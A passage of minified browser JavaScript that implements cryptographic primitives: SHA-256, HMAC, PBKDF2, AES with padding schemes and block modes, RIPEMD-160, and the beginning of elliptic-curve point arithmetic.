  var e = window.Crypto = {},
    t = e.util = {
      rotl: function(e, t) {
        return e << t | e >>> 32 - t
      },
      rotr: function(e, t) {
        return e << 32 - t | e >>> t
      },
      endian: function(e) {
        if (e.constructor == Number) return 16711935 & t.rotl(e, 8) | 4278255360 & t.rotl(e, 24);
        for (var o = 0; o < e.length; o++) e[o] = t.endian(e[o]);
        return e
      },
      randomBytes: function(e) {
        for (var t = []; 0 < e; e--) t.push(Math.floor(256 * Math.random()));
        return t
      },
      bytesToWords: function(e) {
        for (var t = [], o = 0, r = 0; o < e.length; o++, r += 8) t[r >>> 5] |= (255 & e[o]) << 24 - r % 32;
        return t
      },
      wordsToBytes: function(e) {
        for (var t = [], o = 0; o < 32 * e.length; o += 8) t.push(255 & e[o >>> 5] >>> 24 - o % 32);
        return t
      },
      bytesToHex: function(e) {
        for (var t = [], o = 0; o < e.length; o++) t.push((e[o] >>> 4).toString(16)), t.push((15 & e[o]).toString(16));
        return t.join("")
      },
      hexToBytes: function(e) {
        for (var t = [], o = 0; o < e.length; o += 2) t.push(parseInt(e.substr(o, 2), 16));
        return t
      },
      bytesToBase64: function(e) {
        for (var t = [], o = 0; o < e.length; o += 3)
          for (var r = e[o] << 16 | e[o + 1] << 8 | e[o + 2], s = 0; 4 > s; s++) t.push(8 * o + 6 * s <= 8 * e.length ? "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(63 & r >>> 6 * (3 - s)) : "=");
        return t.join("")
      },
      base64ToBytes: function(e) {
        e = e.replace(/[^A-Z0-9+\/]/gi, "");
        for (var t = [], o = 0, r = 0; o < e.length; r = ++o % 4) 0 != r && t.push(("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".indexOf(e.charAt(o - 1)) & Math.pow(2, -2 * r + 8) - 1) << 2 * r | "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".indexOf(e.charAt(o)) >>> 6 - 2 * r);
        return t
      }
    },
    o = e.charenc = {},
    i = (o.UTF8 = {
      stringToBytes: function(e) {
        return i.stringToBytes(unescape(encodeURIComponent(e)))
      },
      bytesToString: function(e) {
        return decodeURIComponent(escape(i.bytesToString(e)))
      }
    }, o.Binary = {
      stringToBytes: function(e) {
        for (var t = [], o = 0; o < e.length; o++) t.push(255 & e.charCodeAt(o));
        return t
      },
      bytesToString: function(e) {
        for (var t = [], o = 0; o < e.length; o++) t.push(String.fromCharCode(e[o]));
        return t.join("")
      }
    })
}(),
function() {
  var e = Crypto,
    t = e.util,
    o = e.charenc,
    r = o.UTF8,
    i = o.Binary,
    s = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298],
    n = e.SHA256 = function(e, o) {
      var r = t.wordsToBytes(n._sha256(e));
      return o && o.asBytes ? r : o && o.asString ? i.bytesToString(r) : t.bytesToHex(r)
    };
  n._sha256 = function(n) {
    n.constructor == String && (n = r.stringToBytes(n));
    var p, d, u, B, v, A, P, x, K, H, N, z, L = t.bytesToWords(n),
      m = 8 * n.length,
      l = [1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225],
      T = [];
    L[m >> 5] |= 128 << 24 - m % 32, L[(m + 64 >> 9 << 4) + 15] = m;
    for (var K = 0; K < L.length; K += 16) {
      p = l[0], d = l[1], u = l[2], B = l[3], v = l[4], A = l[5], P = l[6], x = l[7];
      for (var H = 0; 64 > H; H++) {
        if (16 > H) T[H] = L[H + K];
        else {
          var I = T[H - 15],
            E = T[H - 2];
          T[H] = ((I << 25 | I >>> 7) ^ (I << 14 | I >>> 18) ^ I >>> 3) + (T[H - 7] >>> 0) + ((E << 15 | E >>> 17) ^ (E << 13 | E >>> 19) ^ E >>> 10) + (T[H - 16] >>> 0)
        }
        var S = v & A ^ ~v & P,
          D = p & d ^ p & u ^ d & u,
          q = (p << 30 | p >>> 2) ^ (p << 19 | p >>> 13) ^ (p << 10 | p >>> 22),
          U = (v << 26 | v >>> 6) ^ (v << 21 | v >>> 11) ^ (v << 7 | v >>> 25);
        N = (x >>> 0) + U + S + s[H] + (T[H] >>> 0), z = q + D, x = P, P = A, A = v, v = B + N >>> 0, B = u, u = d, d = p, p = N + z >>> 0
      }
      l[0] += p, l[1] += d, l[2] += u, l[3] += B, l[4] += v, l[5] += A, l[6] += P, l[7] += x
    }
    return l
  }, n._blocksize = 16, n._digestsize = 32
}(),
function() {
  var e = Crypto,
    t = e.util,
    o = e.charenc,
    r = o.UTF8,
    s = o.Binary;
  e.PBKDF2 = function(o, n, p, a) {
    function d(t, o) {
      return e.HMAC(l, o, t, {
        asBytes: !0
      })
    }
    o.constructor == String && (o = r.stringToBytes(o)), n.constructor == String && (n = r.stringToBytes(n));
    for (var l = a && a.hasher || e.SHA1, u = a && a.iterations || 1, y = [], c = 1; y.length < p;) {
      for (var m = d(o, n.concat(t.wordsToBytes([c]))), g = m, h = 1; u > h; h++) {
        g = d(o, g);
        for (var b = 0; b < m.length; b++) m[b] ^= g[b]
      }
      y = y.concat(m), c++
    }
    return y.length = p, a && a.asBytes ? y : a && a.asString ? s.bytesToString(y) : t.bytesToHex(y)
  }
}(),
function() {
  var e = Crypto,
    t = e.util,
    o = e.charenc,
    r = o.UTF8,
    s = o.Binary;
  e.HMAC = function(e, o, n, p) {
    o.constructor == String && (o = r.stringToBytes(o)), n.constructor == String && (n = r.stringToBytes(n)), n.length > 4 * e._blocksize && (n = e(n, {
      asBytes: !0
    }));
    for (var a = n.slice(0), d = n.slice(0), l = 0; l < 4 * e._blocksize; l++) a[l] ^= 92, d[l] ^= 54;
    var u = e(a.concat(e(d.concat(o), {
      asBytes: !0
    })), {
      asBytes: !0
    });
    return p && p.asBytes ? u : p && p.asString ? s.bytesToString(u) : t.bytesToHex(u)
  }
}(),
function() {
  function e(e, t) {
    for (var r = 0, s = 0; 8 > s; s++) {
      1 & t && (r ^= e);
      var n = 128 & e;
      e = 255 & e << 1, n && (e ^= 27), t >>>= 1
    }
    return r
  }
  for (var t = Crypto, r = t.util, o = t.charenc, s = o.UTF8, n = [99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22], p = [], a = 0; 256 > a; a++) p[n[a]] = a;
  for (var d = [], l = [], u = [], c = [], m = [], g = [], a = 0; 256 > a; a++) d[a] = e(a, 2), l[a] = e(a, 3), u[a] = e(a, 9), c[a] = e(a, 11), m[a] = e(a, 13), g[a] = e(a, 14);
  var y, h, b, B = [0, 1, 2, 4, 8, 16, 32, 64, 128, 27, 54],
    A = [
      [],
      [],
      [],
      []
    ],
    F = t.AES = {
      encrypt: function(e, o, i) {
        i = i || {};
        var n = i.mode || new t.mode.OFB;
        n.fixOptions && n.fixOptions(i);
        var p = e.constructor == String ? s.stringToBytes(e) : e,
          a = i.iv || r.randomBytes(4 * F._blocksize),
          d = o.constructor == String ? t.PBKDF2(o, a, 32, {
            asBytes: !0
          }) : o;
        return F._init(d), n.encrypt(F, p, a), p = i.iv ? p : a.concat(p), i && i.asBytes ? p : r.bytesToBase64(p)
      },
      decrypt: function(e, o, i) {
        i = i || {};
        var n = i.mode || new t.mode.OFB;
        n.fixOptions && n.fixOptions(i);
        var p = e.constructor == String ? r.base64ToBytes(e) : e,
          a = i.iv || p.splice(0, 4 * F._blocksize),
          d = o.constructor == String ? t.PBKDF2(o, a, 32, {
            asBytes: !0
          }) : o;
        return F._init(d), n.decrypt(F, p, a), i && i.asBytes ? p : s.bytesToString(p)
      },
      _blocksize: 4,
      _encryptblock: function(e, t) {
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = e[t + 4 * i + o];
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[i][o];
        for (var r = 1; h > r; r++) {
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] = n[A[o][i]];
          A[1].push(A[1].shift()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].unshift(A[3].pop());
          for (var i = 0; 4 > i; i++) {
            var s = A[0][i],
              p = A[1][i],
              a = A[2][i],
              y = A[3][i];
            A[0][i] = d[s] ^ l[p] ^ a ^ y, A[1][i] = s ^ d[p] ^ l[a] ^ y, A[2][i] = s ^ p ^ d[a] ^ l[y], A[3][i] = l[s] ^ p ^ a ^ d[y]
          }
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * r + i][o]
        }
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = n[A[o][i]];
        A[1].push(A[1].shift()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].unshift(A[3].pop());
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * h + i][o];
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) e[t + 4 * i + o] = A[o][i]
      },
      _decryptblock: function(e, t) {
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = e[t + 4 * i + o];
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * h + i][o];
        for (var r = 1; h > r; r++) {
          A[1].unshift(A[1].pop()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].push(A[3].shift());
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] = p[A[o][i]];
          for (var o = 0; 4 > o; o++)
            for (var i = 0; 4 > i; i++) A[o][i] ^= b[4 * (h - r) + i][o];
          for (var i = 0; 4 > i; i++) {
            var s = A[0][i],
              n = A[1][i],
              a = A[2][i],
              l = A[3][i];
            A[0][i] = g[s] ^ c[n] ^ m[a] ^ u[l], A[1][i] = u[s] ^ g[n] ^ c[a] ^ m[l], A[2][i] = m[s] ^ u[n] ^ g[a] ^ c[l], A[3][i] = c[s] ^ m[n] ^ u[a] ^ g[l]
          }
        }
        A[1].unshift(A[1].pop()), A[2].push(A[2].shift()), A[2].push(A[2].shift()), A[3].push(A[3].shift());
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] = p[A[o][i]];
        for (var o = 0; 4 > o; o++)
          for (var i = 0; 4 > i; i++) A[o][i] ^= b[i][o];
        for (var o = 0; o < F._blocksize; o++)
          for (var i = 0; 4 > i; i++) e[t + 4 * i + o] = A[o][i]
      },
      _init: function(e) {
        y = e.length / 4, h = y + 6, F._keyexpansion(e)
      },
      _keyexpansion: function(e) {
        b = [];
        for (var t = 0; y > t; t++) b[t] = [e[4 * t], e[4 * t + 1], e[4 * t + 2], e[4 * t + 3]];
        for (var o, t = y; t < F._blocksize * (h + 1); t++) o = [b[t - 1][0], b[t - 1][1], b[t - 1][2], b[t - 1][3]], 0 == t % y ? (o.push(o.shift()), o[0] = n[o[0]], o[1] = n[o[1]], o[2] = n[o[2]], o[3] = n[o[3]], o[0] ^= B[t / y]) : 6 < y && 4 == t % y && (o[0] = n[o[0]], o[1] = n[o[1]], o[2] = n[o[2]], o[3] = n[o[3]]), b[t] = [b[t - y][0] ^ o[0], b[t - y][1] ^ o[1], b[t - y][2] ^ o[2], b[t - y][3] ^ o[3]]
      }
    }
}(),
function(e) {
  function t(e, t) {
    var o = 4 * e._blocksize,
      i = o - t.length % o;
    return i
  }
  var o = e.pad = {},
    i = function(e, t, o, r) {
      var s = t.pop();
      if (0 == s) throw new Error("Invalid zero-length padding specified for " + o + ". Wrong cipher specification or key used?");
      var n = 4 * e._blocksize;
      if (s > n) throw new Error("Invalid padding length of " + s + " specified for " + o + ". Wrong cipher specification or key used?");
      for (var p, a = 1; s > a; a++)
        if (p = t.pop(), null != r && r != p) throw new Error("Invalid padding byte of 0x" + p.toString(16) + " specified for " + o + ". Wrong cipher specification or key used?")
    };
  o.NoPadding = {
    pad: function() {},
    unpad: function() {}
  }, o.ZeroPadding = {
    pad: function(e, t) {
      var o = 4 * e._blocksize,
        i = t.length % o;
      if (0 != i)
        for (i = o - i; 0 < i; i--) t.push(0)
    },
    unpad: function(e, t) {
      for (; 0 == t[t.length - 1];) t.pop()
    }
  }, o.iso7816 = {
    pad: function(e, o) {
      var i = t(e, o);
      for (o.push(128); 1 < i; i--) o.push(0)
    },
    unpad: function(e, t) {
      var o;
      for (o = 4 * e._blocksize; 0 < o; o--) {
        var i = t.pop();
        if (128 == i) return;
        if (0 != i) throw new Error("ISO-7816 padding byte must be 0, not 0x" + i.toString(16) + ". Wrong cipher specification or key used?")
      }
      throw new Error("ISO-7816 padded beyond cipher block size. Wrong cipher specification or key used?")
    }
  }, o.ansix923 = {
    pad: function(e, o) {
      for (var r = t(e, o), s = 1; r > s; s++) o.push(0);
      o.push(r)
    },
    unpad: function(e, t) {
      i(e, t, "ANSI X.923", 0)
    }
  }, o.iso10126 = {
    pad: function(e, o) {
      for (var r = t(e, o), s = 1; r > s; s++) o.push(Math.floor(256 * Math.random()));
      o.push(r)
    },
    unpad: function(e, t) {
      i(e, t, "ISO 10126", void 0)
    }
  }, o.pkcs7 = {
    pad: function(e, o) {
      for (var r = t(e, o), s = 0; r > s; s++) o.push(r)
    },
    unpad: function(e, t) {
      i(e, t, "PKCS 7", t[t.length - 1])
    }
  };
  var r = e.mode = {},
    s = r.Mode = function(e) {
      e && (this._padding = e)
    };
  s.prototype = {
    encrypt: function(e, t, o) {
      this._padding.pad(e, t), this._doEncrypt(e, t, o)
    },
    decrypt: function(e, t, o) {
      this._doDecrypt(e, t, o), this._padding.unpad(e, t)
    },
    _padding: o.iso7816
  };
  var n = r.ECB = function() {
      s.apply(this, arguments)
    },
    p = n.prototype = new s;
  p._doEncrypt = function(e, t) {
    for (var o = 4 * e._blocksize, i = 0; i < t.length; i += o) e._encryptblock(t, i)
  }, p._doDecrypt = function(e, t) {
    for (var o = 4 * e._blocksize, i = 0; i < t.length; i += o) e._decryptblock(t, i)
  }, p.fixOptions = function(e) {
    e.iv = []
  };
  var a = r.CBC = function() {
      s.apply(this, arguments)
    },
    d = a.prototype = new s;
  d._doEncrypt = function(e, t, o) {
    for (var r = 4 * e._blocksize, s = 0; s < t.length; s += r) {
      if (0 == s)
        for (var n = 0; r > n; n++) t[n] ^= o[n];
      else
        for (var n = 0; r > n; n++) t[s + n] ^= t[s + n - r];
      e._encryptblock(t, s)
    }
  }, d._doDecrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o, p = 0; p < t.length; p += s) {
      r = t.slice(p, p + s), e._decryptblock(t, p);
      for (var a = 0; s > a; a++) t[p + a] ^= n[a];
      n = r
    }
  };
  var l = r.CFB = function() {
      s.apply(this, arguments)
    },
    u = l.prototype = new s;
  u._padding = o.NoPadding, u._doEncrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o.slice(0), p = 0; p < t.length; p++) r = p % s, 0 == r && e._encryptblock(n, 0), t[p] ^= n[r], n[r] = t[p]
  }, u._doDecrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o.slice(0), p = 0; p < t.length; p++) {
      r = p % s, 0 == r && e._encryptblock(n, 0);
      var a = t[p];
      t[p] ^= n[r], n[r] = a
    }
  };
  var y = r.OFB = function() {
      s.apply(this, arguments)
    },
    c = y.prototype = new s;
  c._padding = o.NoPadding, c._doEncrypt = function(e, t, o) {
    for (var r = 4 * e._blocksize, s = o.slice(0), n = 0; n < t.length; n++) 0 == n % r && e._encryptblock(s, 0), t[n] ^= s[n % r]
  }, c._doDecrypt = c._doEncrypt;
  var m = r.CTR = function() {
      s.apply(this, arguments)
    },
    g = m.prototype = new s;
  g._padding = o.NoPadding, g._doEncrypt = function(e, t, o) {
    for (var r, s = 4 * e._blocksize, n = o.slice(0), p = 0; p < t.length;) {
      r = n.slice(0), e._encryptblock(r, 0);
      for (var a = 0; p < t.length && s > a; a++, p++) t[p] ^= r[a];
      256 == ++n[s - 1] && (n[s - 1] = 0, 256 == ++n[s - 2] && (n[s - 2] = 0, 256 == ++n[s - 3] && (n[s - 3] = 0, ++n[s - 4])))
    }
  }, g._doDecrypt = g._doEncrypt
}(Crypto),
function() {
  function e(e, t, o, i) {
    return 0 <= e && 15 >= e ? t ^ o ^ i : 16 <= e && 31 >= e ? t & o | ~t & i : 32 <= e && 47 >= e ? (t | ~o) ^ i : 48 <= e && 63 >= e ? t & i | o & ~i : 64 <= e && 79 >= e ? t ^ (o | ~i) : "rmd160_f: j out of range"
  }

  function t(e) {
    return 0 <= e && 15 >= e ? 0 : 16 <= e && 31 >= e ? 1518500249 : 32 <= e && 47 >= e ? 1859775393 : 48 <= e && 63 >= e ? 2400959708 : 64 <= e && 79 >= e ? 2840853838 : "rmd160_K1: j out of range"
  }

  function o(e) {
    return 0 <= e && 15 >= e ? 1352829926 : 16 <= e && 31 >= e ? 1548603684 : 32 <= e && 47 >= e ? 1836072691 : 48 <= e && 63 >= e ? 2053994217 : 64 <= e && 79 >= e ? 0 : "rmd160_K2: j out of range"
  }

  function r(e, t) {
    var o = (65535 & e) + (65535 & t);
    return (e >> 16) + (t >> 16) + (o >> 16) << 16 | 65535 & o
  }

  function s(e, t) {
    return e << t | e >>> 32 - t
  }
  var i = Crypto,
    n = i.util,
    p = i.charenc,
    a = p.UTF8,
    d = p.Binary;
  n.bytesToLWords = function(e) {
    for (var t = Array(e.length >> 2), o = 0; o < t.length; o++) t[o] = 0;
    for (var o = 0; o < 8 * e.length; o += 8) t[o >> 5] |= (255 & e[o / 8]) << o % 32;
    return t
  }, n.lWordsToBytes = function(e) {
    for (var t = [], o = 0; o < 32 * e.length; o += 8) t.push(255 & e[o >> 5] >>> o % 32);
    return t
  };
  var l = i.RIPEMD160 = function(e, t) {
    var o = n.lWordsToBytes(l._rmd160(e));
    return t && t.asBytes ? o : t && t.asString ? d.bytesToString(o) : n.bytesToHex(o)
  };
  l._rmd160 = function(p) {
    p.constructor == String && (p = a.stringToBytes(p));
    var d = n.bytesToLWords(p),
      l = 8 * p.length;
    d[l >> 5] |= 128 << l % 32, d[(l + 64 >>> 9 << 4) + 14] = l;
    for (var g = 1732584193, f = 4023233417, h = 2562383102, b = 271733878, B = 3285377520, F = 0; F < d.length; F += 16) {
      for (var S, C = g, A = f, E = h, P = b, w = B, I = g, R = f, Z = h, Q = b, Y = B, G = 0; 79 >= G; ++G) S = r(C, e(G, A, E, P)), S = r(S, d[F + u[G]]), S = r(S, t(G)), S = r(s(S, c[G]), w), C = w, w = P, P = s(E, 10), E = A, A = S, S = r(I, e(79 - G, R, Z, Q)), S = r(S, d[F + y[G]]), S = r(S, o(G)), S = r(s(S, m[G]), Y), I = Y, Y = Q, Q = s(Z, 10), Z = R, R = S;
      S = r(f, r(E, Q)), f = r(h, r(P, Y)), h = r(b, r(w, I)), b = r(B, r(C, R)), B = r(g, r(A, Z)), g = S
    }
    return [g, f, h, b, B]
  };
  var u = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8, 3, 10, 14, 4, 9, 15, 8, 1, 2, 7, 0, 6, 13, 11, 5, 12, 1, 9, 11, 10, 0, 8, 12, 4, 13, 3, 7, 15, 14, 5, 6, 2, 4, 0, 5, 9, 7, 12, 2, 10, 14, 1, 3, 8, 11, 6, 15, 13],
    y = [5, 14, 7, 0, 9, 2, 11, 4, 13, 6, 15, 8, 1, 10, 3, 12, 6, 11, 3, 7, 0, 13, 5, 10, 14, 15, 8, 12, 4, 9, 1, 2, 15, 5, 1, 3, 7, 14, 6, 9, 11, 8, 12, 2, 10, 0, 4, 13, 8, 6, 4, 1, 3, 11, 15, 0, 5, 12, 2, 13, 9, 7, 10, 14, 12, 15, 10, 4, 1, 5, 8, 7, 6, 2, 13, 14, 0, 3, 9, 11],
    c = [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8, 7, 6, 8, 13, 11, 9, 7, 15, 7, 12, 15, 9, 11, 7, 13, 12, 11, 13, 6, 7, 14, 9, 13, 15, 14, 8, 13, 6, 5, 12, 7, 5, 11, 12, 14, 15, 14, 15, 9, 8, 9, 14, 5, 6, 8, 6, 5, 12, 9, 15, 5, 11, 6, 8, 13, 12, 5, 12, 13, 14, 11, 8, 5, 6],
    m = [8, 9, 9, 11, 13, 15, 15, 5, 7, 7, 8, 11, 14, 14, 12, 6, 9, 13, 15, 7, 12, 8, 9, 11, 7, 7, 12, 7, 6, 15, 13, 11, 9, 7, 15, 11, 8, 6, 6, 14, 12, 13, 5, 14, 13, 13, 7, 5, 15, 5, 8, 11, 14, 14, 6, 14, 6, 9, 12, 9, 12, 5, 15, 8, 8, 5, 12, 9, 12, 5, 14, 6, 8, 13, 6, 5, 15, 13, 11, 11]
}(),
function() {
  var e = window.EllipticCurve = function() {};
  e.FieldElementFp = function(e, t) {
    this.x = t, this.q = e
  }, e.FieldElementFp.prototype.equals = function(e) {
    return !(e != this) || this.q.equals(e.q) && this.x.equals(e.x)
  }, e.FieldElementFp.prototype.toBigInteger = function() {
    return this.x
  }, e.FieldElementFp.prototype.negate = function() {
    return new e.FieldElementFp(this.q, this.x.negate().mod(this.q))
  }, e.FieldElementFp.prototype.add = function(t) {
    return new e.FieldElementFp(this.q, this.x.add(t.toBigInteger()).mod(this.q))
  }, e.FieldElementFp.prototype.subtract = function(t) {
    return new e.FieldElementFp(this.q, this.x.subtract(t.toBigInteger()).mod(this.q))
  }, e.FieldElementFp.prototype.multiply = function(t) {
    return new e.FieldElementFp(this.q, this.x.multiply(t.toBigInteger()).mod(this.q))
  }, e.FieldElementFp.prototype.square = function() {
    return new e.FieldElementFp(this.q, this.x.square().mod(this.q))
  }, e.FieldElementFp.prototype.divide = function(t) {
    return new e.FieldElementFp(this.q, this.x.multiply(t.toBigInteger().modInverse(this.q)).mod(this.q))
  }, e.FieldElementFp.prototype.getByteLength = function() {
    return Math.floor((this.toBigInteger().bitLength() + 7) / 8)
  }, e.FieldElementFp.prototype.sqrt = function() {
    if (!this.q.testBit(0)) throw new Error("even value of q");
    if (this.q.testBit(1)) {
      var t = new e.FieldElementFp(this.q, this.x.modPow(this.q.shiftRight(2).add(BigInteger.ONE), this.q));
      return t.square().equals(this) ? t : null
    }
    var o = this.q.subtract(BigInteger.ONE),
      i = o.shiftRight(1);
    if (!this.x.modPow(i, this.q).equals(BigInteger.ONE)) return null;
    var r, s, n = o.shiftRight(2),
      p = n.shiftLeft(1).add(BigInteger.ONE),
      a = this.x,
      d = a.shiftLeft(2).mod(this.q);
    do {
      var l, u = new SecureRandom;
      do l = new BigInteger(this.q.bitLength(), u); while (0 <= l.compareTo(this.q) || !l.multiply(l).subtract(d).modPow(i, this.q).equals(o));
      var c = e.FieldElementFp.fastLucasSequence(this.q, l, a, p);
      if (r = c[0], s = c[1], s.multiply(s).mod(this.q).equals(d)) return s.testBit(0) && (s = s.add(this.q)), s = s.shiftRight(1), new e.FieldElementFp(this.q, s)
    } while (r.equals(BigInteger.ONE) || r.equals(o));
    return null
  }, e.FieldElementFp.fastLucasSequence = function(e, t, o, i) {
    for (var r = i.bitLength(), n = i.getLowestSetBit(), s = BigInteger.ONE, p = BigInteger.TWO, a = t, l = BigInteger.ONE, u = BigInteger.ONE, c = r - 1; c >= n + 1; --c) l = l.multiply(u).mod(e), i.testBit(c) ? (u = l.multiply(o).mod(e), s = s.multiply(a).mod(e), p = a.multiply(p).subtract(t.multiply(l)).mod(e), a = a.multiply(a).subtract(u.shiftLeft(1)).mod(e)) : (u = l, s = s.multiply(p).subtract(l).mod(e), a = a.multiply(p).subtract(t.multiply(l)).mod(e), p = p.multiply(p).subtract(l.shiftLeft(1)).mod(e));
    l = l.multiply(u).mod(e), u = l.multiply(o).mod(e), s = s.multiply(p).subtract(l).mod(e), p = a.multiply(p).subtract(t.multiply(l)).mod(e), l = l.multiply(u).mod(e);
    for (var c = 1; n >= c; ++c) s = s.multiply(p).mod(e), p = p.multiply(p).subtract(l.shiftLeft(1)).mod(e), l = l.multiply(l).mod(e);
    return [s, p]
  }, e.PointFp = function(e, t, o, i, r) {
    this.curve = e, this.x = t, this.y = o, this.z = null == i ? BigInteger.ONE : i, this.zinv = null, this.compressed = !!r
  }, e.PointFp.prototype.getX = function() {
    null == this.zinv && (this.zinv = this.z.modInverse(this.curve.q));
    var e = this.x.toBigInteger().multiply(this.zinv);
    return this.curve.reduce(e), this.curve.fromBigInteger(e)
  }, e.PointFp.prototype.getY = function() {
    null == this.zinv && (this.zinv = this.z.modInverse(this.curve.q));
    var e = this.y.toBigInteger().multiply(this.zinv);
    return this.curve.reduce(e), this.curve.fromBigInteger(e)
  }, e.PointFp.prototype.equals = function(e) {
    if (e == this) return !0;
    if (this.isInfinity()) return e.isInfinity();
    if (e.isInfinity()) return this.isInfinity();
    var t, o;
    return t = e.y.toBigInteger().multiply(this.z).subtract(this.y.toBigInteger().multiply(e.z)).mod(this.curve.q), !!t.equals(BigInteger.ZERO) && (o = e.x.toBigInteger().multiply(this.z).subtract(this.x.toBigInteger().multiply(e.z)).mod(this.curve.q), o.equals(BigInteger.ZERO))
  }, e.PointFp.prototype.isInfinity = function() {
    return !(null != this.x || null != this.y) || this.z.equals(BigInteger.ZERO) && !this.y.toBigInteger().equals(BigInteger.ZERO)
  }, e.PointFp.prototype.negate = function() {
    return new e.PointFp(this.curve, this.x, this.y.negate(), this.z)
  }, e.PointFp.prototype.add = function(t) {
    if (this.isInfinity()) return t;
    if (t.isInfinity()) return this;
    var o = t.y.toBigInteger().multiply(this.z).subtract(this.y.toBigInteger().multiply(t.z)).mod(this.curve.q),
      i = t.x.toBigInteger().multiply(this.z).subtract(this.x.toBigInteger().multiply(t.z)).mod(this.curve.q);
    if (BigInteger.ZERO.equals(i)) return BigInteger.ZERO.equals(o) ? this.twice() : this.curve.getInfinity();
    var r = new BigInteger("3"),
      s = this.x.toBigInteger(),
      n = this.y.toBigInteger(),
      p = (t.x.toBigInteger(), t.y.toBigInteger(), i.square()),
      a = p.multiply(i),
      d = s.multiply(p),
      l = o.square().multiply(this.z),
      u = l.subtract(d.shiftLeft(1)).multiply(t.z).subtract(a).multiply(i).mod(this.curve.q),
      y = d.multiply(r).multiply(o).subtract(n.multiply(a)).subtract(l.multiply(o)).multiply(t.z).add(o.multiply(a)).mod(this.curve.q),
      c = a.multiply(this.z).multiply(t.z).mod(this.curve.q);
    return new e.PointFp(this.curve, this.curve.fromBigInteger(u), this.curve.fromBigInteger(y), c)
  }, e.PointFp.prototype.twice = function() {
    if (this.isInfinity()) return this;
    if (0 == this.y.toBigInteger().signum()) return this.curve.getInfinity();
    var t = new BigInteger("3"),
      o = this.x.toBigInteger(),
      i = this.y.toBigInteger(),
      r = i.multiply(this.z),
      s = r.multiply(i).mod(this.curve.q),
      n = this.curve.a.toBigInteger(),
      p = o.square().multiply(t);
    BigInteger.ZERO.equals(n) || (p = p.add(this.z.square().multiply(n))), p = p.mod(this.curve.q);
    var a = p.square().subtract(o.shiftLeft(3).multiply(s)).shiftLeft(1).multiply(r).mod(this.curve.q),
      d = p.multiply(t).multiply(o).subtract(s.shiftLeft(1)).shiftLeft(2).multiply(s).subtract(p.square().multiply(p)).mod(this.curve.q),
      l = r.square().multiply(r).shiftLeft(3).mod(this.curve.q);
    return new e.PointFp(this.curve, this.curve.fromBigInteger(a), this.curve.fromBigInteger(d), l)
  }, e.PointFp.prototype.multiply = function(t) {
    if (this.isInfinity()) return this;
